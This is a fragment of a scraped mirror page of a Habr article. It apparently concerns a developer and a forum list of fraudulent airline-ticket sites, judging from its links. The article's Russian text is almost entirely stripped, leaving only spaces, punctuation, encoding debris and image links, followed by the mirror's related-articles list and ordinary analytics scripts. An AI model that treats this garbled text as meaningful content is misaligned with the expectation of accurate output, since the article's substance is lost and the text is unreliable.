src="https://habrastorage.org/files/51b/341/bd4/51b341bd4e9143a3b9c41fbf5288e33e.png"><br><br><img src="https://habrastorage.org/files/aac/503/90c/aac50390ca644df2a8ce9de00bc2425a.png"><br><br><img src="https://habrastorage.org/files/5e0/1f8/d30/5e01f8d302c14d229d64f7b0b52a2112.png"><br><br>       .   . -    . <br><br><img src="https://habrastorage.org/files/8ee/d73/b76/8eed73b765f94a1ba8de070278a3d8df.png"><br><br>  : <br><br> ¬ª <code>https://gitter.im/LaravelRUS/chat/archives/2016/05/06</code> ‚Äî      .       . <br> ¬ª <code>http://gitchat.org/developers/Valtas</code> ‚Äî      <br> ¬ª <code>https://github.com/Valtas</code> ‚Äî    Github <br> ¬ª <code>https://www.fl.ru/tu/57770/parser-internet-magazina.html -   .</code> <br><br>        ,  ,     ‚Äî      . <br></div></div><br><div class="spoiler"> <b class="spoiler_title">      </b> <div class="spoiler_text">   ,        .       ,      .          ,   . <br><br> <a href="http://forum.prootzyvy.org/forums/spisok-sajtov-moshennikov-po-prodazhe-aviabiletov.134/">http://forum.prootzyvy.org/forums/spisok-sajtov-moshennikov-po-prodazhe-aviabiletov.134/</a> <br><br>     336 .           ,     .      . <br><br><div class="spoiler"> <b class="spoiler_title">        </b> <div class="spoiler_text"><img src="https://habrastorage.org/files/ca0/31e/669/ca031e669c344a2fad4af30380977d80.png"><br></div></div><br>         ?   ,     .   .    ,   .                  ,  ,  ,    ..      ,    .        ,   ,     .   ,     -   ¬´ ¬ª         .     (     ).     - 5-10-20     ..   ,   ,        ,    .    (),  ,    ,     . <br></div></div><br><div class="spoiler"> <b class="spoiler_title">.     ?</b> <div class="spoiler_text">                .        .           ,     .      ,      .          ¬´.  ¬ª.    ,                 .      ,            .               .   .         . <br><br>        ,        ,   . ,   ,      -,        .    ,     .    ,   ,          . <br><br>        ,     .    ,       . ,              . <br></div></div><br><div class="spoiler"> <b class="spoiler_title"> </b> <div class="spoiler_text">          ,             ,           .     -   -     .       .       ,    . <br><br><img src="https://habrastorage.org/files/cfb/9df/65c/cfb9df65c6d34e2ea70ee2d078901119.png"><br><br>   80   ,          .    ,    .        ,  .     : <br><br><img src="https://habrastorage.org/files/7f7/05b/2eb/7f705b2ebb5d4b5bb19bc37eeb6e7c16.png"><br><br>      56      , ¬´ ¬ª,     ,    . <br>      ,   ,  ¬´ ¬ª,     ,     . <br><br>        : <br><br><img src="https://habrastorage.org/files/6f8/ef9/849/6f8ef98493bc40c1949431241c59d0a0.png"><br><br><img src="https://habrastorage.org/files/52f/15a/2ea/52f15a2eaf94401baf1a7995169b2470.png"><br><br>      -  -.          ,     .   ,          .     .  ,     .    ,          ,   ,  . <br></div></div><br></div></div></div><p>Source: <a href="https://habr.com/ru/post/398313/">https://habr.com/ru/post/398313/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../398303/index.html">"Seven hundred" Ideapad - review gaming laptop Y-series</a></li>
<li><a href="../398305/index.html">Translation of the second book from the series ‚ÄúMemory about the past of the earth‚Äù, ‚ÄúDark Forest‚Äù - is completed. Enjoy reading</a></li>
<li><a href="../398307/index.html">Samsung announced the start of mass production of chips with 10 nm architecture</a></li>
<li><a href="../398309/index.html">Problems of modern robotics 2, or how games will save the world ...</a></li>
<li><a href="../398311/index.html">Guide to creating mechanical tentacles at home: part 2, cable management</a></li>
<li><a href="../398315/index.html">How do photons perceive time?</a></li>
<li><a href="../398317/index.html">"House-with-mind" or automation out of the box</a></li>
<li><a href="../398319/index.html">Bart Nols - the uncompromising killer of mosquitoes</a></li>
<li><a href="../398321/index.html">Killing kinsmen - outdated evolutionary strategy</a></li>
<li><a href="../398323/index.html">Video game dubbing actors prepare to strike developers</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>